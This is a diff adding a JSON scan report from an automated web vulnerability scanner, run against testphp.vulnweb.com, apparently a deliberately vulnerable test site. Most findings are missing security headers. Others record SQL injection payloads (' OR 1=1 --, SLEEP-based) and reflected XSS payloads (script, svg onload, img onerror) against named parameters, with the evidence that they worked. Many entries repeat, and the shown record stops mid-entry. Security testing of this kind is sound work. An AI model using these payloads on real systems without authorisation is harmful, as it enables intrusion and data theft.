@@ -1,0 +1,1942 @@
+{
+  "target": "http://testphp.vulnweb.com",
+  "timestamp": "2025-11-03 11:13:02",
+  "findings": [
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/privacy.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/privacy.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/privacy.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/privacy.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/privacy.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/hpp/",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/hpp/",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/hpp/",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/hpp/",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/hpp/",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/cart.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/cart.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/cart.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/cart.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/cart.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/cart.php?q=%27+OR+%271%27%3D%271",
+      "evidence": "response length changed from 4903 to 6016"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/cart.php?q=%27+OR+1%3D1+--+",
+      "evidence": "response length changed from 4903 to 6016"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/cart.php?q=%22+OR+%22%22+%3D+%22",
+      "evidence": "response length changed from 4903 to 6016"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/cart.php?q=%27%3B+--+",
+      "evidence": "response length changed from 4903 to 6016"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/cart.php?q=%27+OR+SLEEP%285%29--",
+      "evidence": "response length changed from 4903 to 6016"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/artists.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/artists.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/artists.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/categories.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/categories.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/categories.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/categories.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/categories.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/index.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/index.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/index.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/index.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/index.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/AJAX/index.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/disclaimer.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/disclaimer.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/disclaimer.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/disclaimer.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/disclaimer.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/login.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/login.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/login.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/login.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/login.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/userinfo.php",
+      "param": "uname",
+      "payload": "' OR SLEEP(5)--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/userinfo.php",
+      "param": "pass",
+      "payload": "' OR SLEEP(5)--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/userinfo.php",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/userinfo.php",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/userinfo.php",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/userinfo.php",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/userinfo.php",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/userinfo.php",
+      "param": "uname",
+      "payload": "' OR SLEEP(5)--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/userinfo.php",
+      "param": "pass",
+      "payload": "' OR SLEEP(5)--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/userinfo.php?q=%27+OR+%271%27%3D%271",
+      "evidence": "response length changed from 5523 to 6008"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/userinfo.php?q=%27+OR+1%3D1+--+",
+      "evidence": "response length changed from 5523 to 6008"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/userinfo.php?q=%22+OR+%22%22+%3D+%22",
+      "evidence": "response length changed from 5523 to 6008"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/userinfo.php?q=%27%3B+--+",
+      "evidence": "response length changed from 5523 to 6008"
+    },
+    {
+      "type": "SQLi-suspected",
+      "param": "q",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/userinfo.php?q=%27+OR+SLEEP%285%29--",
+      "evidence": "response length changed from 5523 to 6008"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR '1'='1",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+%271%27%3D%271",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR 1=1 -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+1%3D1+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "\" OR \"\" = \"",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3%22+OR+%22%22+%3D+%22",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "'; -- ",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3%27%3B+--+",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR SLEEP(5)--",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3%27+OR+SLEEP%285%29--",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-reflected",
+      "param": "cat",
+      "payload": "\"><script>alert(1)</script>",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=3%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "evidence": "payload reflected in response body"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Content-Security-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+      "evidence": "No Content-Security-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Frame-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+      "evidence": "No X-Frame-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "X-Content-Type-Options",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+      "evidence": "No X-Content-Type-Options header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Referrer-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+      "evidence": "No Referrer-Policy header present"
+    },
+    {
+      "type": "Header-Missing",
+      "header": "Permissions-Policy",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+      "evidence": "No Permissions-Policy header present"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "' OR 1=1 -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "SQLi-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "'; -- ",
+      "evidence": "SQL syntax; check the manual that corresponds to your MySQL"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "SQLi",
+      "param": "cat",
+      "payload": "' OR '1'='1",
